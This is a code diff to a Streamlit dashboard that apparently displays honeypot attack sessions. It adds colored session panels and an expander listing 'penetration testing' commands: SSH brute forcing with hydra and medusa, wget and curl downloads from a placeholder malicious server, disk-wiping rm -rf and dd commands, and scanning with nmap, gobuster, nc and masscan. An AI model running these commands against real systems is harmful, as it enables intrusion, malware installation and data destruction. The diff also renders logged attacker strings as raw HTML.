@@ -54,8 +54,43 @@ RECON_PATTERNS = [
 
 BRUTE_FORCE_THRESHOLD = 5
 
-# --- Optimized Functions ---
+# --- Attack Color Mapping ---
+ATTACK_COLORS = {
+    "Brute Force Attack": "#D1ECF1",  # Light blue
+    "Destructive Attack (Wiper)": "#FFB6B6",  # Light red
+    "Malware Download Attempt": "#FFF3CD",  # Light yellow
+    "Reconnaissance / Enumeration": "#E2E3E5",  # Light gray
+    "Port Scanning / Connection Attempt": "#D4EDDA",  # Light green
+    "Command Injection Attempt": "#F8D7DA",  # Light pink
+    "Successful Login": "#D1E7DD",  # Light teal
+    "Failed Login": "#F8F9FA"  # Light white
+}
 
+# --- Penetration Testing Commands ---
+PENTEST_COMMANDS = {
+    "Brute Force Attack": [
+        "hydra -L users.txt -P passwords.txt ssh://<TARGET_IP>",
+        "medusa -h <TARGET_IP> -U users.txt -P passwords.txt -M ssh"
+    ],
+    "Malware Download Attempt": [
+        "wget http://<MALICIOUS_SERVER>/malware.sh -O /tmp/malware.sh",
+        "curl -o /tmp/malware.exe http://<MALICIOUS_SERVER>/malware.exe"
+    ],
+    "Destructive Attack (Wiper)": [
+        "rm -rf /important/directory/*",
+        "dd if=/dev/zero of=/dev/sda bs=1M"
+    ],
+    "Reconnaissance / Enumeration": [
+        "nmap -sV -T4 <TARGET_IP>",
+        "gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt"
+    ],
+    "Port Scanning / Connection Attempt": [
+        "nc -zv <TARGET_IP> 1-1000",
+        "masscan -p1-1000 <TARGET_IP> --rate=1000"
+    ]
+}
+
+# --- Optimized Functions ---
 @st.cache_resource
 def get_connection():
     return psycopg2.connect(
@@ -222,17 +257,21 @@ if not df.empty:
 
     st.markdown("---")
 
+    # --- Penetration Testing Guide ---
+    with st.expander("🔓 Penetration Testing Commands (Click to Expand)"):
+        st.write("Use these commands to simulate attacks for testing:")
+        
+        for attack_type, commands in PENTEST_COMMANDS.items():
+            st.markdown(f"**{attack_type}**")
+            for cmd in commands:
+                st.code(cmd, language='bash')
+            st.markdown("---")
+
     # --- Highlight Table ---
     st.subheader("📋 Latest Captured Sessions")
     
     def highlight_rows(row):
-        colors = {
-            "Destructive Attack (Wiper)": '#FFB6B6',
-            "Malware Download Attempt": '#FFF3CD',
-            "Brute Force Attack": '#D1ECF1',
-            "Reconnaissance / Enumeration": '#E2E3E5'
-        }
-        return ['background-color: ' + colors.get(row['attack_type'], '')] * len(row)
+        return ['background-color: ' + ATTACK_COLORS.get(row['attack_type'], '')] * len(row)
     
     attack_filter = st.selectbox("🔍 Filter by Attack Type:", ["All"] + sorted(df['attack_type'].unique()))
     filtered_df = df if attack_filter == "All" else df[df['attack_type'] == attack_filter]
@@ -256,6 +295,8 @@ if not df.empty:
 
     if selected_session:
         selected_row = df[df['session'] == selected_session].iloc[0]
+        attack_type = selected_row['attack_type']
+        bg_color = ATTACK_COLORS.get(attack_type, "#FFFFFF")
         
         with st.spinner('Generating attack graph...'):
             G = build_session_graph(selected_row)
@@ -292,15 +333,17 @@ if not df.empty:
                 )
             os.unlink(tmp_file.name)
 
-        # Session details
+        # Session details with colored background
         st.markdown(f"""
-        **Session Details:**
-        - **Source IP:** `{selected_row.get('src_ip', 'N/A')}`
-        - **Attack Type:** `{selected_row['attack_type']}`
-        - **Target Port:** `{selected_row.get('dst_port', 'N/A')}`
-        - **Timestamp:** `{selected_row.get('timestamp', 'N/A')}`
-        - **Details:** `{selected_row.get('attack_details', 'N/A')}`
-        """)
+        <div style="background-color:{bg_color}; padding:15px; border-radius:10px">
+        <h4>Session Details</h4>
+        <p><b>Source IP:</b> <code>{selected_row.get('src_ip', 'N/A')}</code></p>
+        <p><b>Attack Type:</b> <code>{attack_type}</code></p>
+        <p><b>Target Port:</b> <code>{selected_row.get('dst_port', 'N/A')}</code></p>
+        <p><b>Timestamp:</b> <code>{selected_row.get('timestamp', 'N/A')}</code></p>
+        <p><b>Details:</b> <code>{selected_row.get('attack_details', 'N/A')}</code></p>
+        </div>
+        """, unsafe_allow_html=True)
 
 else:
     st.warning("⚠️ No data found.")
